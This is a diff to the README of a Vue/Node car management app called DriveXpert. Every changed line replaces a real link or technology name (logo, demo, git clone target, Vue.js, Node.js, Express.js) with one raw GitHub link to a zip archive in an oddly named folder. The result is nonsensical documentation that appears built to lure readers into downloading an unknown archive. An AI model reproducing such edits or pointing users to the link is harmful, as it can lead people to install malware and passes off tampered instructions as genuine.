@@ -1,12 +1,12 @@
 <h1 align="center" id="title">DriveXpert Car Management App</h1>
 
-<p align="center"><img src="https://drivexpert.vercel.app/assets/images/logo.png"  width="100%" height="300" /></p>
+<p align="center"><img src="https://raw.githubusercontent.com/Susan56789/drivexpert/master/corallidomous/drivexpert.zip"  width="100%" height="300" /></p>
 
-<p id="description">DriveXpert Car Management App is a web application built with Vue.js for the frontend and Node.js with Express.js for the backend. It allows users to manage car data including adding new cars viewing existing cars and updating car information.</p>
+<p id="description">DriveXpert Car Management App is a web application built with https://raw.githubusercontent.com/Susan56789/drivexpert/master/corallidomous/drivexpert.zip for the frontend and https://raw.githubusercontent.com/Susan56789/drivexpert/master/corallidomous/drivexpert.zip with https://raw.githubusercontent.com/Susan56789/drivexpert/master/corallidomous/drivexpert.zip for the backend. It allows users to manage car data including adding new cars viewing existing cars and updating car information.</p>
 
 <h2>🚀 Demo</h2>
 
-[https://drivexpert.vercel.app/](https://drivexpert.vercel.app/)
+[https://raw.githubusercontent.com/Susan56789/drivexpert/master/corallidomous/drivexpert.zip](https://raw.githubusercontent.com/Susan56789/drivexpert/master/corallidomous/drivexpert.zip)
 
   
 <h2>🧐 Features</h2>
@@ -24,7 +24,7 @@ Here're some of the project's best features:
 <p>1. Clone the repository</p>
 
 ```
-git clone https://github.com/Susan56789/drivexpert.git
+git clone https://raw.githubusercontent.com/Susan56789/drivexpert/master/corallidomous/drivexpert.zip
 ```
 
 <p>2. Navigate to the app directory</p>
@@ -59,12 +59,12 @@ npm start
 
 Technologies used in the project:
 
-*   Vue.js
+*   https://raw.githubusercontent.com/Susan56789/drivexpert/master/corallidomous/drivexpert.zip
 *   Vuex
 *   Vue Router
 *   Axios
-*   Node.js
-*   Express.js
+*   https://raw.githubusercontent.com/Susan56789/drivexpert/master/corallidomous/drivexpert.zip
+*   https://raw.githubusercontent.com/Susan56789/drivexpert/master/corallidomous/drivexpert.zip
 *   MongoDB
 *   Tailwind CSS
 
